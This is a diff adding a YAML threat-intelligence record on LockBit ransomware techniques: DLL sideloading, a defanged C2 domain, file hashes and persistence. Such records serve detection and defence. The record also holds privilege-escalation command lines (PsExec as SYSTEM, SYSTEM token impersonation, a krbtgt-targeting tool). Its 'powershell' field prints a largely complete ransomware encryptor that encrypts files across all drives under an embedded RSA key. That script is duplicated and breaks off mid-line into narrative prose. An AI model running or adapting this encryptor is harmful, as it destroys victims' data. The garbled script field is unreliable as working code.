@@ -1,0 +1,107 @@
+description: LockBit ransomware attackers use DLL sideloading and masquerading tactics
+  to evade detection.
+attribution:
+- Syrphid (APT group)
+malware_families:
+- LockBit
+TTPs:
+  processes:
+  - jarsigner.exe
+  - MpCmdRun.exe
+  - Clink_x86.exe
+  - nssm.exe
+  - TokenUtils.exe
+  - sd1.exe
+  - <domain>.exe
+  - explorer.exe
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - PsExec64.exe -s -i cmd
+  - TokenUtils.exe ListTokens
+  - TokenUtils.exe Execute -u NT AUTHORITY\\SYSTEM -e whoami -c
+  - TokenUtils.exe Execute -u NT AUTHORITY\\SYSTEM -e cmd.exe -c
+  - Sd1 <sub-domain>.<domain>.local <domain>.local krbtgt
+  - Sd1 <sub-domain>.<domain>.local <domain> <domain>\\<domain user>
+  powershell:
+  - 'function GER($n) {-join (1..$n|%{\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:'',.<>?`~\"[(Get-Random -Maximum 74)]})}
+    function err($pl,$sf){$rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider;$rsa.FromXmlString($sf);$PB=[Text.Encoding]::UTF8.GetBytes($pl);$rsa.Encrypt($PB,$false)}
+    function gg($path) {$ke = GER(32);$ig =GER(16);$sf = ''<RSAKeyValue><Modulus>lo233NH3Nv8AgTnugGImrUa13XuzHYyGSkgsgLrvz0y7MYix+U1eIYdF7BarhqKJXT1HZcijWzdz2BzdZ1uvoSr9/41CMCAdkV1ISWuzdnQ2LLGdP1FaEvFls+p8P/hlBJd+D6WoFceRZ0QzRfj0qikaXT89KSZlJFrZg6LeojGvorzw7UVNwR+uXvBWKx+Ez4hNmxa2cLXyhmHA4QrUZ/xsG1u0j9Fk6Mqc4q6Vfb1x9NHR9W+caJbRs1RQENAkY2TqIRVjS5qIInB57gHxbuBp6WbBmtSJUJHnVqDu77U0BD80IYL3ggzAdazWoBarX81ZIRjZPb6+Ehmc/FL8+Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>'';
+    $eec=err -pl $ke+$ig -sf $sf;$eee=[System.Convert]::ToBase64String($eec);$key=[System.Text.Encoding]::UTF8.GetBytes($ke);$iv=[System.Text.Encoding]::UTF8.GetBytes($ig);try{$files=gci
+    $path -Recurse -Include *.pdf,*.txt, *.doc, *.docx, *.odt, *.rtf, *.md, *.csv,
+    *.tsv, *.jpg, *.jpeg, *.tiff, *.mp3, *.xls, *.xlsx, *.ods, *.ppt, *.pptx, *.odp,
+    *.py, *.java, *.cpp, *.c, *.html, *.css, *.js, *.php, *.swift, *.kotlin, *.go,
+    *.rb, *.sh, *.sql, *.db, *.sqlite, *.sqlite3, *.mdb, *.sql, *.zip, *.rar, *.7z,
+    *.tar, *.gz, *.bz2, *.iso, *.torrent, *.ini, *.json, *.xml, *.log, *.bak, *.cfg,
+    *.psd, *.vmdk | select -Expand FullName; foreach ($file in $files) { try {EFI
+    $file $key $iv $eee} catch{}}} catch {Write-Host $_ }} function EFI($ifi,$key,$iv,$aT)
+    {if($ifi.EndsWith(\".xlockxlock\", [System.StringComparison]::OrdinalIgnoreCase))
+    {return};$aes = [System.Security.Cryptography.Aes]::Create();$aes.KeySize = 256;$aes.Key=$key;$aes.IV=$iv;try{$yy=New-Object
+    System.IO.FileStream($ifi, [System.IO.FileMode]::Open,[System.IO.FileAccess]::ReadWrite,
+    [System.IO.FileShare]::None); $xx=$aes.CreateEncryptor($aes.Key, $aes.IV); $mm
+    = New-Object System.Security.Cryptography.CryptoStream($yy, $xx, [System.Security.Cryptography.CryptoStreamMode]::Write);
+    $yy.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null; $jj = New-Object byte[]
+    ($yy.Length); $yy.Read($jj, 0, $jj.Length) | Out-Null; $yy.Seek(0, [System.IO.SeekOrigin]::Begin)
+    | Out-Null; $mm.Write($jj, 0, $jj.Length); $mm.FlushFinalBlock(); $se = 1 } catch
+    { Write-Error $_ } finally {if ($mm) { $mm.Dispose() } if ($yy) { $yy.Dispose()
+    } }try {$kk = [System.Text.Encoding]::UTF8.GetBytes($aT);$bb = New-Object System.IO.FileStream($ifi,[System.IO.FileMode]::Append,[System.IO.FileAccess]::Write,[System.IO.FileShare]::None);if
+    ($se){$bb.Write($kk, 0, $kk.Length)}} catch {Write-Error $_} finally {if ($bb)
+    { $bb.Dispose();if ($se){ren $ifi -NewName $ifi\".xlockxlock\";}}}};$vg =gdr -PS
+    FileSystem | select -Expand Root;foreach ($II in $vg) {gg -path \"$II\"}:Jiefunction
+    GER($n) {-join (1..$n|%{\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:'',.<>?`~\"[(Get-Random
+    -Maximum 74)]})}function err($pl,$sf){$rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider;$rsa.FromXmlString($sf);$PB=[Text.Encoding]::UTF8.GetBytes($pl);$rsa.Encrypt($PB,$false)}
+    function gg($path) {$ke = GER(32);$ig =GER(16);$sf = ''<RSAKeyValue><Modulus>lo233NH3Nv8AgTnugGImrUa13XuzHYyGSkgsgLrvz0y7MYix+U1eIYdF7BarhqKJXT1HZcijWzdz2BzdZ1uvoSr9/41CMCAdkV1ISWuzdnQ2LLGdP1FaEvFls+p8P/hlBJd+D6WoFceRZ0QzRfj0qikaXT89KSZlJFrZg6LeojGvorzw7UVNwR+uXvBWKx+Ez4hNmxa2cLXyhmHA4QrUZ/xsG1u0j9Fk6Mqc4q6Vfb1x9NHR9W+caJbRs1RQENAkY2TqIRVjS5qIInB57gHxbuBp6WbBmtSJUJHnVqDu77U0BD80IYL3ggzAdazWoBarX81ZIRjZPb6+Ehmc/FL8+Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>'';
+    $eec=err -pl $ke+$ig -sf $sf;$eee=[System.Convert]::ToBase64String($eec);$key=[System.Text.Encoding]::UTF8.GetBytes($ke);$iv=[System.Text.Encoding]::UTF8.GetBytes($ig);try{$files=gci
+    $path -They also used DLL side loading for encryption, as mentioned above, and
+    also dropped a few ransomware executable files and executed them directly.
+
+    '
+  scripting_engine:
+  - VBS
+  - JScript
+  - Python
+  - Bash
+  registry_keys: []
+  image_load:
+  - jarsigner.exe -> jli.dll
+  - MpCmdRun.exe -> mpclient.dll
+  - Clink_x86.exe -> clink_dll_x86.dll
+  network_connections:
+  - jarsigner.exe -> msupdate[.]updatemicfosoft[.]com:443
+  - <domain>.exe -> msupdate[.]updatemicfosoft[.]com:443
+  file_activity:
+  - C:\\Windows\\System32\\jarsigner.exe
+  - C:\\Users\\test\\AppData\\Roaming\\mpclient.dll
+  - C:\\Users\\test\\AppData\\Roaming\\clink_dll_x86.dll
+  - C:\\Users\\test\\AppData\\Roaming\\<domain>.exe
+  persistence:
+  - NSSM service creation for RAT (edge.exe.exe)
+  - PsExec running cmd as SYSTEM user
+  pipes: []
+  process_relations:
+  - jarsigner.exe -> jli.dll
+  - MpCmdRun.exe -> mpclient.dll
+  - Clink_x86.exe -> clink_dll_x86.dll
+IOCs:
+  hashes:
+  - f689ee9af94b00e9e3f0bb072b34caaf207f32dcb4f5782fc9ca351df9a06c97
+  - 5ca8e1d001a2c3800afce017424ca471f3cba41f9089791074a9cb7591956430
+  - 0201a6dbe62d35b81d7cd7d7a731612458644b5e3b1abe414b0ea86d3266ab03
+  - 1cd644b750884906b707419c8f40598c04f1402e4e93cbf4a33f3254846dc870
+  - edcf76600cd11ef7d6a5c319087041abc604e571239fe2dae4bca83688821a3a
+  - 011b31d7e12a2403507a71deb33335d0e81f626d08ff68575a298edac45df4cb
+  - 4147589aa11732438751c2ecf3079fb94fa478a01ac4f08d024fb55f7ffb52f3
+  - 10f1a789e515fdaf9c04e56b8a5330cfb1995825949e6db8c9eaba4ea9914c97
+  - 086567b46fca2a27d404d9b61bdb482394e1591dc13f1302b813bb2ddf5e54cf
+  - 6285d32a9491a0084da85a384a11e15e203badf67b1deed54155f02b7338b108
+  - 785e5aaecd9430451f4b0bad637658e6afeea1e722b3d0dd674cb6a11f4ce286
+  - 24480dbe306597da1ba393b6e30d542673066f98826cc07ac4b9033137f37dbf
+  IPs:
+  - msupdate[.]updatemicfosoft[.]com
+  domains:
+  - msupdate[.]updatemicfosoft[.]com
+authors:
+- Vishal Kamble
+reference: https://www.security.com/threat-intelligence/lockbit-ransomware-attack-techniques
+date_of_publication: August 12, 2025
+file_creation_date: August 12, 2025
